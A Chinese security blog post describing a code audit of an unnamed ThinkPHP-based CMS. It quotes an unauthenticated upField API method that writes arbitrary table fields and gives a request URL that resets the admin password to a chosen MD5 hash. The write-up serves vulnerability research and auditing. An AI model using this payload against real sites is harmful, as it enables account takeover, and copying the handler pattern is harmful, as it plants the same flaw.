#  某CMS权限绕过漏洞（0Day）   
 Jie安全   2024-11-23 05:01  
  
**免责申明**  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
  
  
**一、前言**  
  
          
不会存在相关的POC，要POC的师傅可以划走啦，这个文章记录一下自己在给xx做代码审计的一次权限绕过，大致源码方式是（得到目标->提取指纹->github搜索->拿到源码），这里可实现前台rce效果，着重讲解如何进行权限绕过的审计。  
  
**二、审计过程**  
  
    在拿到源码之后，先来查看文件目录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoks7HDePECibYfu8FFFibnvDSCG8HltE3j8VjjRUjiaURGaMBU9aOyI411BQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到为经典的TP开发框架，这里让其页面报错发现为TP5.0.10。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksHbJNBDY98iaJWicX19XGCSlKzvHOZ6XnOOsjoY6YplTmoicwFVaEmQPIQ/640?wx_fmt=png&from=appmsg "")  
  
使用工具进行扫描之后未发现漏洞，开始审计，这里我们先看Application下的Controller层。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksFrpRCZpAIiajc1QlrupAK6C9jNOOricdDNS2VTgiauYOW2XOGQN21tp5w/640?wx_fmt=png&from=appmsg "")  
  
admin目录就没必要看了，直接看前台可以访问到的即可，api目录，查看相关代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVokss6ZAb2H1gN9mGnrnNdP4bYeWwkuJgOKEMYPrfKlfPmFRTUkiamJ75Eg/640?wx_fmt=png&from=appmsg "")  
  
这里可以看到存在一个方法upField方法，代码如下:  
```
    public function upField(){
        $table=input('table');//表名
        $id_name=input('id_name');//条件字段
        $id_value=input('id_value');//条件值
        $field=input('field');//修改的字段
        $field_value=input('field_value');//修改的值
        if ($field_value=='false'){
            $field_value=2;
        }
        if (empty($table)||empty($id_name)||empty($id_value)||empty($field)||$field_value===false){
            return ajaxReturn(0,'参数不足');
        }
        $where[$id_name]=['eq',$id_value];
        $status=Db::name($table)->where($where)->setField($field,$field_value);
        if ($status){
            return ajaxReturn(200,'操作成功');
        }else{
            return ajaxReturn(0,'操作失败');
        }
    }
```  
  
可以看到最终调用了方法setFiled。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoks6dTD1QpxfeV5XAnIxh7dmDjb1Judlic74ic9IiaW9yAOd5AETiczuxyGicg/640?wx_fmt=png&from=appmsg "")  
  
跟入发现调用的是update更新方法，并且这里对更新的表table也是可控的，内容也是可控的，所以第一时间想到的就是把管理员密码通过方法给更新掉。  
  
先来看看数据库的信息。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksib3q5vaqRoQZEspicN3LguYrB7QRdQpkqAONzQJkWzTgaedX2xpTLFyw/640?wx_fmt=png&from=appmsg "")  
  
可以看到存储在了ybk_admin_user表当中，password其实可以看出来是md5加密的，保险起见从代码找下password的存储方式。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksyibQ3JfCPwYk3BiaHsxjaUNw0hSy0iapJJQ4ZKtxVUSSTiaiaDRThvDWH6Q/640?wx_fmt=png&from=appmsg "")  
  
可以看到用户输入的password经过md5加密与数据库当中取出来的password进行比较，说明确实是md5加密。  
  
**三、漏洞验证**  
  
****  
访问路由http://127.0.0.1/index.php/api/Api/upField  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksjnGyXHcbadU3QN6WWzpAgmvRTn2UFbEaRAIyoBQoce3ic0AwkFot6JA/640?wx_fmt=png&from=appmsg "")  
  
可以看到参数不足，开始补充参数，再经过慢慢调试之后如下payload：  
```
http://127.0.0.1/index.php/api/Api/upField?table=admin_user&id_name=user_id&id_value=1&field=password&field_value=1
```  
  
这里表示操作admin_user表，并且字段为user_id值为1其中的password字段的值为1。  
  
查看一下数据库的值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksNsibXazKLMbF8kG2bO0BdERSPhcSta87aS6MpibOrA7ibQcF6Wmq4A7RA/640?wx_fmt=png&from=appmsg "")  
  
可以看到成果更改了，因为登陆验证为md5加密比较，所以我们把我们想要更改的密码进行md5加密之后更改即可，这里以123为例。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksHGVV44on1RX4GA4FKb4HNzh3dtR6icqByueu2w2EhrNnODkawVtA3XA/640?wx_fmt=png&from=appmsg "")  
  
进行修改：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVokss4b2U6lNyFn8JLtWk6Qm24mnwicibkpMQ80WR2V3oE4Hib9dLoeCGxpIw/640?wx_fmt=png&from=appmsg "")  
  
查看数据库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksIxFaRkJbJXt7O0Zx10B1dNdmLPMDZJfEr1NayW6icAVVvgAtFDANPZg/640?wx_fmt=png&from=appmsg "")  
  
尝试登陆。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhV17MEVSlFD9ZIuVvXbVoksOXoKaER5QV356ibypT1FdibSTTAAFWxoSibsWKlso7qgtIhXAEc1vq7Lw/640?wx_fmt=png&from=appmsg "")  
  
**四、完结**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg "")  
  
****  
